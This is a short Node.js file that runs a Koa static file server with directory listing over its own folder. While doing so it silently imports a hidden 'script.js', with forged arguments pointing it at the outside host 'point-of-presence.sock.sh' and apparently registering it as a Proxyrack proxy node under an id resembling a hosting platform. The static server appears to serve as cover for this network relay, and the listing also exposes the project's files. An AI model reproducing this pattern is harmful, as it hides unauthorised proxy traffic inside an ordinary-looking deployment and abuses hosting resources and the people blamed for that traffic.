import child_process from 'child_process'
import path from 'path'
import Koa from 'koa'
import serve from 'koa-static'
import list from 'koa2-serve-index'
import process from 'process'

const app = new Koa()
app.use(list(import.meta.dirname)).use(serve(import.meta.dirname))
process.argv = [process.execPath, 'script.js', '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443','--id', 'vercelcom0', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP']
import('./script.js')
app.listen(3000)
